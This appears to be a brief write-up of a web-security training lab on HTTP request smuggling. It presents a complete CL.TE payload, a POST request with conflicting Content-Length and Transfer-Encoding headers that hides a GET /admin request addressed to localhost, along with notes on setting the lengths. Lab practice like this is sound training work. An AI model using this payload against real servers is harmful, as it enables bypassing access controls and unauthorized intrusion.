![te cl multicase-smuggle](https://github.com/user-attachments/assets/1d8637cd-dcd7-4449-b923-8a5015f516d4)

## CL.TE

1) Set Automatic Content-Length.
2) 
```
POST / HTTP/1.1
Host: 0a1f00c9039d64f984fa09cc00200052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

h=
```

- `h=` because it will inject into a variable next standard `POST / HTTP/2`;
- Content-Length: 3 -// always +1 more than symbols in parameters.
